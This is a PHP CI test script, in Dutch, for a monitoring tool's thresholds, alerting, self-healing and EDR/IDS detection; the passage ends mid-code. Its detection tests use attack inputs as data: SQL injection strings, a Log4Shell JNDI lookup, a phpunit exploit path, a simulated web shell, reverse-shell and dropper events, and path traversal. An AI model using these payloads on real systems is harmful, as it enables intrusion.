<?php
/**
 * PHP-tests (GitHub Actions, met een lege MariaDB): de rekenkant van slimme drempels, bundelen, zelf herstellen,
 * de statuspagina en Analyse, en dat een update geen instellingen verandert.
 * Gebruik: php tests/php/run.php   (op een testdatabase: de tests voegen checks en meetwaarden toe)
 */
declare(strict_types=1);

if (PHP_SAPI !== 'cli') {
    exit("Alleen via CLI\n");
}
require __DIR__ . '/../../src/bootstrap.php';
I18n::set('nl');

$fails = 0;
$n = 0;
function ok(bool $cond, string $what): void
{
    global $fails, $n;
    $n++;
    if ($cond) {
        echo "  ✔ $what\n";
    } else {
        $fails++;
        echo "  ✘ $what\n";
    }
}
function section(string $s): void
{
    echo "\n$s\n";
}

section('Database en update');
Installer::runSchema();
save_setting('thresh_default', 'manual');
Installer::runSchema();
ok(setting('thresh_default') === 'manual' || q("SELECT value FROM settings WHERE name = 'thresh_default'")->fetchColumn() === 'manual', 'een update laat een gewijzigde instelling staan');
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-a', '10.0.0.1', 'agent'), ('ci-b', '10.0.0.2', 'agent'), ('ci-gw', '10.0.0.254', 'remote')");
$ha = (int) q("SELECT id FROM hosts WHERE name = 'ci-a'")->fetchColumn();
$hb = (int) q("SELECT id FROM hosts WHERE name = 'ci-b'")->fetchColumn();
$gw = (int) q("SELECT id FROM hosts WHERE name = 'ci-gw'")->fetchColumn();
q('INSERT INTO checks (host_id, type, name, warn_threshold, crit_threshold) VALUES (?, ?, ?, 85, 95)', [$ha, 'cpu', 'CPU']);
$cpu = (int) db()->lastInsertId();
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() === 'auto', 'een nieuwe check begint op "auto"');

section('Slimme drempels');
mt_srand(7);
$rows = [];
for ($t = time() - 28 * 86400; $t < time(); $t += 600) {
    $h = (int) date('G', $t);
    $v = 20 + 15 * sin(($h - 6) / 24 * M_PI) + mt_rand(0, 80) / 10;
    if ($h === 3) {
        $v = 92 + mt_rand(0, 70) / 10;   // back-up 's nachts
    }
    if (time() - $t < 7 * 86400) {
        $v += 12;                        // sluipende stijging
    }
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $cpu, $v, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
q("UPDATE checks SET thresh_mode = 'manual' WHERE id = ?", [$cpu]);
$m = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cpu])->fetch());
$mon3 = 3;          // maandag 3:00
$mon14 = 14;        // maandag 14:00
ok($m !== null && $m['days'] >= 7, 'leert uit 28 dagen meetwaarden');
ok($m['w'][$mon3] > 100, 'de back-up om 3:00 is normaal: warning boven 100% (' . round($m['w'][$mon3]) . ')');
ok($m['w'][$mon14] >= 50 && $m['w'][$mon14] < 85, 'overdag een warning tussen 50 en 85% (' . round($m['w'][$mon14]) . ')');
ok(($m['sim']['fixed'] ?? 0) > ($m['sim']['smart'] ?? 99), 'slim geeft minder dagen met een warning dan vast (' . $m['sim']['fixed'] . ' → ' . $m['sim']['smart'] . ')');
ok($m['drift'] !== null, 'de sluipende stijging wordt gezien');
$row = q('SELECT c.*, h.mode FROM checks c JOIN hosts h ON h.id = c.host_id WHERE c.id = ?', [$cpu])->fetch();
$row['thresh_mode'] = 'guard';
$row['guard_threshold'] = 90;
$eff = Smart::apply($row);
ok((float) $eff['crit_threshold'] <= 90, 'het vangnet geldt altijd (critical ≤ 90)');
ok(!Smart::eligible(['type' => 'disk']), 'disks leren niet');
ok(Smart::eligible(['type' => 'snmp', 'metric' => 'temp']) && !Smart::eligible(['type' => 'snmp', 'metric' => 'uptime']), 'SNMP: temperatuur wel, uptime niet');
ok(!Smart::eligible(['type' => 'ping', 'reverse_ok' => 1]), 'omgekeerde checks leren niet');
q("UPDATE checks SET thresh_mode = 'auto' WHERE id = ?", [$cpu]);
save_setting('thresh_default', 'guard');
$r2 = Smart::apply(q('SELECT * FROM checks WHERE id = ?', [$cpu])->fetch() + ['hid' => $ha]);
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() !== 'auto', '"auto" wordt bij de eerste run de standaard');

// 1.108.1: grillige check (camera-webinterface): elke dag één losse piek. Telt zoals een melding (melden na N).
q("INSERT INTO checks (host_id, type, target, name, warn_threshold, crit_threshold, thresh_mode) VALUES (?, 'http', 'http://cam', 'Camera', 500, 2000, 'manual')", [$ha]);
$cam = (int) db()->lastInsertId();
$rows = [];
for ($t = time() - 14 * 86400; $t < time(); $t += 300) {
    $spike = (int) date('G', $t) === ((int) date('j', $t) * 7) % 24 && (int) date('i', $t) < 5;   // elke dag op een ander uur
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $cam, $spike ? 3000 : 90 + mt_rand(0, 300) / 10, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
$m1 = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cam])->fetch());
ok($m1['sim']['need'] === 1 && $m1['sim']['fixed'] >= 13 && $m1['sim']['spiky'], 'melden na 1: elke dag een warning, en grillig (' . $m1['sim']['fixed'] . '/' . $m1['sim']['smart'] . ')');
q('UPDATE checks SET notify_fails = 3 WHERE id = ?', [$cam]);
$m3 = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cam])->fetch());
ok($m3['sim']['need'] === 3 && $m3['sim']['fixed'] === 0 && $m3['sim']['smart'] === 0, 'melden na 3: losse pieken tellen niet als dag met warning');
$prop = array_values(array_filter(Smart::proposals(), static fn($p) => $p['id'] === $cam))[0] ?? null;
ok($prop && $prop['gain'] === 0 && $prop['spiky'] && $prop['need'] === 3, 'voorstel: geen winst, grillig');

section('Bundelen');
q('UPDATE hosts SET parent_id = ? WHERE id IN (?, ?)', [$gw, $ha, $hb]);
$items = [];
foreach ([$ha, $hb] as $h) {
    $items[] = ['item' => ['status' => STATUS_CRIT], 'check' => ['hid' => $h]];
}
$cause = Bundle::cause($items);
ok($cause !== null && str_contains($cause, 'ci-gw'), 'gemeenschappelijke oorzaak: dezelfde server erboven');
ok(str_contains(Bundle::title($items, $cause), '2'), 'titel noemt het aantal servers');
q('UPDATE hosts SET parent_id = NULL WHERE id IN (?, ?)', [$ha, $hb]);
ok(Bundle::cause([$items[0]]) === null, 'één server is geen bundel');

section('Zelf herstellen en waakhond');
ok(Heal::clean(['type' => 'service'], 'restart') === 'restart', 'herstarten mag bij een service');
ok(Heal::clean(['type' => 'ping'], 'restart') === null, 'herstarten mag niet bij een ping-check');
ok(Heal::clean(['type' => 'ping'], 'cmd:fix-db') === 'cmd:fix-db', 'een herstelcommando op naam');
ok(Heal::clean(['type' => 'ping'], 'cmd:../../bin/sh') === null, 'geen paden in de naam van een herstelcommando');
save_setting('pushover_enabled', '1');
save_setting('pushover_user', 'ci-user');
save_setting('pushover_token', 'ci-token');
q('UPDATE hosts SET watchdog = 1, watchdog_min = 3 WHERE id = ?', [$ha]);
$plain = implode("\n", Heal::testLines($ha, false));
$secure = implode("\n", Heal::testLines($ha, true));
ok(str_contains($secure, 'ci-token') && !str_contains($plain, 'ci-token'), 'Pushover-gegevens alleen in een versleutelde lijst');

section('Statuspagina');
StatusPage::save(['on' => true, 'title' => 'Thuis', 'items' => [['label' => 'CPU', 'checks' => [$cpu]], ['label' => '', 'checks' => [1]]]]);
ok(count(StatusPage::items()) === 1, 'onderdelen zonder naam vallen weg');
ok(StatusPage::on() && preg_match('/^[a-f0-9]{32}$/', StatusPage::token()) === 1, 'aan, met een geheime sleutel');
$d = StatusPage::data();
ok($d['title'] === 'Thuis' && count($d['components'][0]['days']) === StatusPage::DAYS, 'pagina met 90 dagen per onderdeel');

section('Analyse');
Analytics::cron();
$rep = Analytics::report('7d');
ok(isset($rep['kpi'], $rep['todo'], $rep['reliability']), 'rapport over 7 dagen');

section('Slimme voorstellen (1.108.0)');
// Een check die 6× kort misging (binnen 2 minuten weer goed), elke nacht om 2:05
q('INSERT INTO checks (host_id, type, target, name, interval_sec, thresh_mode) VALUES (?, ?, ?, ?, 60, ?)', [$hb, 'tcp', '22', 'SSH', 'manual']);
$ssh = (int) db()->lastInsertId();
for ($d = 6; $d >= 1; $d--) {
    $t = strtotime(date('Y-m-d', strtotime("-$d days")) . ' 02:05:00');
    q('INSERT INTO status_changes (check_id, from_status, to_status, message, created_at) VALUES (?, 0, 2, ?, ?), (?, 2, 0, ?, ?)',
        [$ssh, 'down', date('Y-m-d H:i:s', $t), $ssh, 'up', date('Y-m-d H:i:s', $t + 100)]);
}
// Samen uitvallen: ci-b valt 4× tegelijk uit met ci-gw (een router)
q("UPDATE hosts SET kind = 'router' WHERE id = ?", [$gw]);
q('INSERT INTO checks (host_id, type, name) VALUES (?, ?, ?)', [$gw, 'ping', 'Ping']);
$gwPing = (int) db()->lastInsertId();
q('INSERT INTO checks (host_id, type, name) VALUES (?, ?, ?)', [$hb, 'ping', 'Ping']);
$bPing = (int) db()->lastInsertId();
for ($i = 1; $i <= 4; $i++) {
    $t = date('Y-m-d H:i:s', strtotime("-$i days 14:00"));
    q('INSERT INTO status_changes (check_id, from_status, to_status, message, created_at) VALUES (?, 0, 2, ?, ?), (?, 0, 2, ?, ?)', [$gwPing, 'x', $t, $bPing, 'x', $t]);
}
$nAdv = Advice::cron(true);
$adv = Advice::list();
$kinds = array_count_values(array_column($adv, 'kind'));
ok(($kinds['fails'] ?? 0) >= 1, 'voorstel: melden na meer mislukte checks');
ok(($kinds['maint'] ?? 0) >= 1, 'voorstel: vast onderhoudsvenster rond 2:00');
ok(($kinds['dep'] ?? 0) >= 1 && in_array('ci-gw', array_column($adv, 'parent'), true), 'voorstel: ci-b hangt af van ci-gw');
foreach ($adv as $a) {
    Advice::decide($a['id'], true);
}
ok((int) q('SELECT notify_fails FROM checks WHERE id = ?', [$ssh])->fetchColumn() >= 2, 'toegepast: melden na N staat hoger');
ok((int) q('SELECT parent_id FROM hosts WHERE id = ?', [$hb])->fetchColumn() === $gw, 'toegepast: afhankelijkheid ingesteld');
$w = q('SELECT * FROM maint_windows LIMIT 1')->fetch();
ok($w && $w['start'] === '01:55', 'toegepast: venster vanaf 01:55, net voor de storingen van 2:05 (' . ($w['start'] ?? '-') . ', ' . ($w['minutes'] ?? '-') . ' min)');
$in = strtotime(date('Y-m-d') . ' 02:10:00');
ok(Advice::windowFor($ssh, $hb, $in) !== null && Advice::windowFor($ssh, $hb, $in + 3 * 3600) === null, 'venster geldt om 2:10, niet om 5:10');
Advice::cron(true);
ok(Advice::openCount() === 0, 'toegepaste voorstellen komen niet terug');

section('Escaleren, oorzaak, afwijkingen, disk, heartbeat, interval');
$esc = new ReflectionMethod('Monitor', 'escalation');
save_setting('esc_on', '0');
ok($esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 3600) === null, 'escaleren uit: niets');
save_setting('esc_on', '1');
save_setting('esc_crit_min', '15');
save_setting('esc_quiet', '0');
ok($esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 600) === null && $esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 1000) === 2, 'critical na 15 min → nood (prioriteit 2)');
q("INSERT INTO alerts (check_id, host_id, status, title, message, kind, created_at) VALUES (NULL, ?, 0, 'ℹ️ INFO: ci-b', 'Agent bijgewerkt van 1.61.1 naar 1.62.0', 'info', NOW() - INTERVAL 3 MINUTE)", [$hb]);
$why = Context::recent(['hid' => $hb]);
ok(str_contains($why, 'Agent bijgewerkt') && str_contains($why, '3 min'), 'oorzaak erbij: ' . $why);
// Afwijking: een SNMP-interfacecheck zonder drempels, normaal ~10, dan 3× 500
q("INSERT INTO checks (host_id, type, metric, target, name, thresh_mode) VALUES (?, 'snmp', 'if', '1', 'eth0', 'manual')", [$ha]);
$if = (int) db()->lastInsertId();
$rows = [];
for ($t = time() - 10 * 86400; $t < time(); $t += 900) {
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $if, 10 + mt_rand(0, 30) / 10, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
$ifRow = q('SELECT c.*, h.name AS host_name, h.id AS hid FROM checks c JOIN hosts h ON h.id = c.host_id WHERE c.id = ?', [$if])->fetch();
ok(Smart::anomEligible($ifRow) && Smart::learnAnom($ifRow) !== null, 'leert wat normaal is bij een check zonder drempels');
$before = (int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% eth0'")->fetchColumn();
for ($i = 0; $i < 3; $i++) {
    $ifRow['anom_streak'] = $i;
    Smart::anomaly($ifRow, ['value' => 500.0, 'status' => 0]);
}
ok((int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% eth0'")->fetchColumn() === $before + 1, 'afwijking na 3 metingen: één ℹ️');
// Disk groeit hard
q("INSERT INTO checks (host_id, type, target, name, warn_threshold, crit_threshold, thresh_mode) VALUES (?, 'disk', '/var', 'Disk /var', 80, 90, 'manual')", [$ha]);
$disk = (int) db()->lastInsertId();
q('INSERT INTO results (check_id, status, value, created_at) VALUES (?, 0, 50, NOW() - INTERVAL 60 MINUTE)', [$disk]);
$dj = new ReflectionMethod('Monitor', 'diskJump');
$dj->invoke(null, ['id' => $disk, 'hid' => $ha, 'host_name' => 'ci-a', 'name' => 'Disk /var'], ['value' => 61.0]);
ok((int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% Disk /var'")->fetchColumn() === 1, 'disk groeit hard: +11 procentpunt in een uur');
// Heartbeat: elke dag rond 2:10, vandaag om 3:00 nog niets
$late = new ReflectionMethod('Heartbeat', 'lateByRhythm');
$oks = [];
for ($d = 6; $d >= 1; $d--) {
    $oks[] = strtotime(date('Y-m-d', strtotime("-$d days")) . ' 02:' . sprintf('%02d', 8 + $d));
}
$msg = $late->invoke(null, ['oks' => $oks], strtotime(date('Y-m-d') . ' 03:00:00'));
ok($msg !== null && str_contains($msg, '02:1'), 'heartbeat te laat volgens zijn ritme: ' . $msg);
ok($late->invoke(null, ['oks' => $oks], strtotime(date('Y-m-d') . ' 02:15:00')) === null, 'heartbeat om 2:15 nog op tijd');
$odd = new ReflectionMethod('Heartbeat', 'oddValue');
ok($odd->invoke(null, ['vals' => [40, 41, 39, 42, 40, 12]], 'GB') !== null, 'back-up veel kleiner dan normaal');
// Slim interval: de query klopt (geen fout) en een check met een probleem is sneller aan de beurt
save_setting('smart_interval', '1');
$sql = new ReflectionMethod('Monitor', 'intervalSql');
$iv = $sql->invoke(null);
q("UPDATE checks SET status = 2, fail_count = 1, interval_sec = 300, last_checked = NOW() - INTERVAL 30 SECOND WHERE id = ?", [$bPing]);
ok((int) q("SELECT COUNT(*) FROM checks c WHERE c.id = ? AND c.last_checked <= NOW() - INTERVAL ($iv - LEAST(15, $iv DIV 4)) SECOND", [$bPing])->fetchColumn() === 1,
    'slim interval: probleem → na 20 s al weer aan de beurt (interval 5 min)');
// 1.108.2: melden na 3 telt met slim interval ook in tijd (3 gewone checks = 2 minuten), niet 3× 20 s
$p3 = ['type' => 'ping', 'notify_fails' => 3, 'interval_sec' => 60];
ok(!Monitor::failsReached($p3, 3, 40) && Monitor::failsReached($p3, 7, 110), 'slim interval: melden na 3 = na ~2 minuten, niet na 40 s');
ok(Monitor::failsReached(['type' => 'cpu', 'notify_fails' => 3, 'interval_sec' => 60], 3, 0), 'checks die niet sneller gaan: gewoon N keer');
save_setting('smart_interval', '0');
ok(Monitor::failsReached($p3, 3, 0) && !Monitor::failsReached($p3, 2, 999), 'zonder slim interval: gewoon N keer');


section('Endpoint-bewaking en inspectie (1.110.0)');
save_setting('ids_enabled', '1');
save_setting('ids_mode', 'learn');
Edr::reset();
ok(count(Sigma::rules()) > 100, 'Sigma-regels geladen (' . count(Sigma::rules()) . ')');
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$ws = ['k' => 'x', 't' => time(), 'pid' => 4242, 'st' => 777, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/dash', 'comm' => 'sh', 'argv' => ['sh', '-c', 'id'], 'cmd' => 'sh -c id', 'pc' => 'php-fpm8.2'];
$r = Edr::process($host, ['ev' => [$ws], 'info' => ['audit' => 'ok', 'file' => 'missing', 'fam' => 'deb']]);
$inc = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'edr' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($inc && (int) $inc['severity'] === 2 && str_starts_with((string) $inc['dkey'], 'rz-webshell|'), 'webserver start een shell → critical (eigen regel)');
ok($r === [] && str_contains((string) $inc['detail'], 'Leren'), 'modus Leren: niets gestopt, wel gemeld');
ok(count(Edr::evidenceFor((int) $inc['id'])) === 1, 'bewijs bij het incident');
save_setting('ids_mode', 'block');
$ws['pid'] = 4243;
$r = Edr::process($host, ['ev' => [$ws]]);
ok(($r['edr_kill'] ?? null) === [[4243, 777]] && (int) q('SELECT COUNT(*) FROM ids_kills WHERE host_id = ? AND pid = 4243', [$ha])->fetchColumn() === 1, 'modus Blokkeren: proces wordt meteen gestopt');
$st = Edr::status(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch());
ok($st['missing'] === ['inotify'], 'ontbrekend onderdeel gemeld: inotify-tools');
// Sigma-regel (alleen Sigma kent deze): chattr -i
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 50, 'st' => 1, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/chattr', 'comm' => 'chattr', 'argv' => ['chattr', '-i', '/etc/passwd'], 'cmd' => 'chattr -i /etc/passwd', 'pc' => 'bash']]]);
$sig = q("SELECT i.* FROM ids_incidents i WHERE host_id = ? AND type = 'edr' AND title LIKE 'Sigma:%' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($sig && (int) $sig['severity'] === 1 && str_contains((string) $sig['detail'], 'SigmaHQ'), 'Sigma-regel raak, met bronvermelding: ' . ($sig['title'] ?? '-'));
// Reverse shell via het netwerk: shell met een verbinding naar buiten
Edr::process($host, ['ev' => [['k' => 'n', 't' => time(), 'dir' => 'out', 'pid' => 61, 'st' => 2, 'exe' => '/usr/bin/bash', 'comm' => 'bash', 'rip' => '203.0.113.9', 'rp' => 9001, 'lp' => 51234]]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr' AND dkey LIKE 'rz-net-shell|%' AND ip = '203.0.113.9'", [$ha])->fetchColumn() === 1, 'shell met een verbinding naar buiten → critical');
// Gewoon proces: geen incident, wel in Live en in edr_seen
$before = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'edr'")->fetchColumn();
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 70, 'st' => 3, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/ls', 'comm' => 'ls', 'argv' => ['ls', '-la'], 'cmd' => 'ls -la', 'pc' => 'bash']]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'edr'")->fetchColumn() === $before && count(Edr::feed(10, $ha)) >= 4, 'gewoon proces: alleen in Live');
// Per server uit: niets verwerken
q('UPDATE hosts SET edr_on = 0 WHERE id = ?', [$ha]);
$n0 = (int) q('SELECT COUNT(*) FROM edr_events')->fetchColumn();
Edr::process(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch(), ['ev' => [$ws]]);
ok((int) q('SELECT COUNT(*) FROM edr_events')->fetchColumn() === $n0 && Edr::agentLines(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch()) === [], 'per server uit: geen sensoren, niets verwerkt');
q('UPDATE hosts SET edr_on = 1 WHERE id = ?', [$ha]);
// Web: SQL-injectie en een bekende exploit, wachtwoord gemaskeerd, IP geblokkeerd
$a = Inspect::analyze('GET', "/item.php?id=1%27%20UNION%20SELECT%20password%20FROM%20users--", 'Mozilla/5.0');
ok(in_array('sqli', array_column($a['tech'], 0), true), 'SQL-injectie herkend (URL-gecodeerd)');
ok((Inspect::analyze('POST', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'curl')['cve'][0] ?? '') === 'CVE-2017-9841', 'bekende exploit met CVE herkend');
ok(Inspect::analyze('GET', '/index.php?page=home', 'Mozilla/5.0')['tech'] === [], 'gewoon verzoek: niets');
ok(Inspect::redact('/login?user=a&password=geheim&x=1') === '/login?user=a&password=***&x=1', 'wachtwoord in de query gemaskeerd');
Inspect::requests($host, [['198.51.100.7', time(), 'GET', "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.y%2Fa%7D", 404, 0, 'Mozilla/5.0', '-']]);
$wi = q("SELECT * FROM ids_incidents WHERE type = 'web_payload' AND ip = '198.51.100.7'")->fetch();
ok($wi && str_contains((string) $wi['title'], 'Log4Shell') && str_contains((string) $wi['detail'], '⛔'), 'Log4Shell-poging: incident en IP geblokkeerd');
// Zoals de agent het stuurt: tijd uit de log, " als \x22 (nginx)
Inspect::requests($host, [['192.0.2.50', '28/Oct/2026:10:00:02 +0100', 'GET', '/?x=1\\x22 OR \\x221\\x22=\\x221', 200, 10, 'Mozilla/5.0', '-']]);
$ev = q("SELECT e.data FROM ids_evidence e JOIN ids_incidents i ON i.id = e.incident_id WHERE i.ip = '192.0.2.50'")->fetchColumn();
$evd = json_decode((string) $ev, true)['ev'] ?? [];
ok(($evd['uri'] ?? '') === '/?x=1" OR "1"="1' && ($evd['at'] ?? 0) === 1793178002, 'verzoek van de agent: \\x22 teruggezet, tijd uit de log (' . ($evd['uri'] ?? '-') . ')');
// "Dit is normaal" bij een endpoint-incident: niet meer melden en niet meer ingrijpen
q("INSERT INTO ids_baseline (host_id, kind, item) VALUES (?, 'ignore', ?)", [$ha, mb_substr('edr|' . $inc['dkey'], 0, 255)]);
$ws['pid'] = 4244;
ok(Edr::process($host, ['ev' => [$ws]]) === [], '"Dit is normaal": proces niet meer gestopt');

section('Afwijkingen, ketens en MITRE (1.111.0)');
ok(Mitre::tech('T1059.004')['name'] === 'Unix Shell' && Mitre::tacticsOf(['T1105']) === ['command-and-control'] && count(Mitre::tactics()) >= 14, 'MITRE ATT&CK geladen');
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND src = 'rule' AND FIND_IN_SET('T1505.003', techs)", [$ha])->fetchColumn() >= 1, 'regeltreffer wordt een signaal met MITRE-techniek');
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND src = 'ids' AND feature = 'web_payload' AND FIND_IN_SET('initial-access', tactics)", [$ha])->fetchColumn() >= 1, 'IDS-incident (webaanval) wordt een signaal: Binnenkomen');
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
ok($host['edr_learn_from'] !== null && Anomaly::learning($host) && (int) q("SELECT COUNT(*) FROM ids_signals WHERE src = 'anom'")->fetchColumn() === 0, 'leerperiode: alles wordt geleerd, niets gemeld');
// Leren afronden; daarna is een nieuw programma onder nginx een afwijking (incident), een nieuw systeemprogramma alleen een signaal
Anomaly::relearn($ha, true);
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$nx = ['k' => 'x', 't' => time(), 'pid' => 900, 'st' => 9, 'uid' => 1001, 'u' => 'app', 'exe' => '/opt/app/worker', 'comm' => 'worker', 'argv' => ['worker'], 'cmd' => 'worker', 'pc' => 'nginx'];
Edr::process($host, ['ev' => [$nx]]);
$an = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'anomaly' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($an && str_contains((string) $an['title'], 'nginx start worker') && (int) $an['severity'] === 1, 'na het leren: nieuw programma onder nginx → afwijking (warning): ' . ($an['title'] ?? '-'));
$n1 = (int) q("SELECT COUNT(*) FROM ids_signals WHERE src = 'anom'")->fetchColumn();
Edr::process($host, ['ev' => [$nx]]);
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE src = 'anom'")->fetchColumn() === $n1, 'zelfde nog eens: al geleerd, geen nieuwe afwijking');
$ni = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'anomaly'")->fetchColumn();
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 901, 'st' => 9, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/tree', 'comm' => 'tree', 'argv' => ['tree'], 'cmd' => 'tree', 'pc' => 'bash']]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'anomaly'")->fetchColumn() === $ni && count(Anomaly::list(1, $ha)) === 2, 'kleine afwijking (nieuw systeemprogramma): alleen op de pagina');
// Ketens op een eigen server: webaanval en daarna code van de webserver
q("INSERT INTO hosts (name, address, mode, edr_on, edr_learn_from) VALUES ('ci-c', '10.0.0.3', 'agent', 1, NOW() - INTERVAL 30 DAY), ('ci-d', '10.0.0.4', 'agent', 1, NOW() - INTERVAL 30 DAY)");
$hc = q("SELECT * FROM hosts WHERE name = 'ci-c'")->fetch();
$hd = q("SELECT * FROM hosts WHERE name = 'ci-d'")->fetch();
Chain::reset();
Inspect::requests($hc, [['203.0.113.77', time(), 'GET', '/shop.php?id=1%27%20UNION%20SELECT%201,2--', 200, 10, 'Mozilla/5.0', '-']]);
Edr::process($hc, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 300, 'st' => 4, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/php8.2', 'comm' => 'php8.2', 'argv' => ['php8.2', 'x.php'], 'cmd' => 'php8.2 x.php', 'pc' => 'php-fpm8.2']]]);
Chain::check($hc);
$ch = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'chain'", [$hc['id']])->fetch();
ok($ch && $ch['dkey'] === 'web|203.0.113.77' && (int) $ch['severity'] === 2, 'keten: webaanval gevolgd door code op de webserver → critical');
ok($ch && str_contains((string) $ch['detail'], '203.0.113.77') && (int) q("SELECT COUNT(*) FROM ids_blocks WHERE host_id = ? AND ip = '203.0.113.77' AND removed_at IS NULL", [$hc['id']])->fetchColumn() >= 1, 'keten in de modus Blokkeren: aanvaller geblokkeerd');
$steps = Chain::list(30, (int) $hc['id'])[0]['steps'] ?? [];
ok(count($steps) >= 2 && in_array('initial-access', $steps[0]['tactics'], true), 'stappen van de keten in volgorde, met tactiek (' . count($steps) . ')');
Chain::check($hc);
ok((int) q("SELECT hits FROM ids_incidents WHERE id = ?", [$ch['id']])->fetchColumn() === 1, 'niets nieuws: keten niet opnieuw');
// Binnenhalen en daarna contact naar buiten (dropper): isoleren
Chain::reset();
Edr::process($hd, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/.cache/kd', 'size' => 1000, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('a', 64)],
    ['k' => 'n', 't' => time() + 1, 'dir' => 'out', 'pid' => 400, 'st' => 5, 'comm' => 'kd', 'exe' => '/tmp/.cache/kd', 'u' => 'root', 'rip' => '198.51.100.99', 'rp' => 3333, 'lp' => 40000]]]);
Chain::check($hd);
$dr = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'chain' AND dkey = 'dropper'", [$hd['id']])->fetch();
ok($dr && (int) $dr['severity'] === 2 && q('SELECT isolate_until > NOW() FROM hosts WHERE id = ?', [$hd['id']])->fetchColumn(), 'keten: binnengehaald en contact naar buiten → server geïsoleerd');
// Verder het netwerk in: login op ci-c vanaf ci-d (waar net een keten was)
Chain::reset();
Chain::lateral($hc, '10.0.0.4', 'bob');
Chain::check($hc);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'chain' AND dkey = ?", [$hc['id'], 'lateral|' . $hd['id']])->fetchColumn() === 1, 'keten: login vanaf een gehackte eigen server → verder het netwerk in');
// MITRE-overzicht
$ov = Chain::overview(30);
$exe = array_values(array_filter($ov['tactics'], static fn($t) => $t['slug'] === 'initial-access'))[0] ?? [];
$t1190 = array_values(array_filter($exe['techs'] ?? [], static fn($t) => $t['id'] === 'T1190'))[0] ?? [];
ok(($t1190['n'] ?? 0) >= 2 && count($ov['tactics']) >= 14, 'MITRE-overzicht: T1190 gezien (' . ($t1190['n'] ?? 0) . '×)');
ok(count(Chain::signals(30, null, null, 'T1190')) >= 2, 'MITRE: signalen bij een techniek');
// Ongewoon tijdstip: actief op een uur waarop dat nooit gebeurde
for ($d = 1; $d <= 8; $d++) {
    q("INSERT INTO edr_hourly (host_id, hr, kind, n) VALUES (?, ?, 'i', 5)", [$hd['id'], date('Y-m-d', strtotime("-$d day")) . ' ' . sprintf('%02d', (int) date('G') === 10 ? 11 : 10) . ':00:00']);
}
Edr::process($hd, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 500, 'st' => 6, 'uid' => 1000, 'auid' => '1000', 'u' => 'bob', 'exe' => '/usr/bin/ls', 'comm' => 'ls', 'argv' => ['ls'], 'cmd' => 'ls', 'pc' => 'bash']]]);
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND feature = 'hour'", [$hd['id']])->fetchColumn() === 1, 'ongewoon tijdstip: actief op een uur zonder geschiedenis');

section('Dreigingsinformatie (1.112.0)');
// Nep-internet: AbuseIPDB, GreyNoise, Shodan, CIRCL, MalwareBazaar, ThreatFox, Tor, URLhaus
$tiLog = [];
ThreatIntel::$http = static function (string $m, string $url, array $h, ?string $body) use (&$tiLog) {
    $tiLog[] = "$m $url";
    $bad = str_contains($url, '203.0.113.60') || str_contains($url, '203.0.113.61');
    return match (true) {
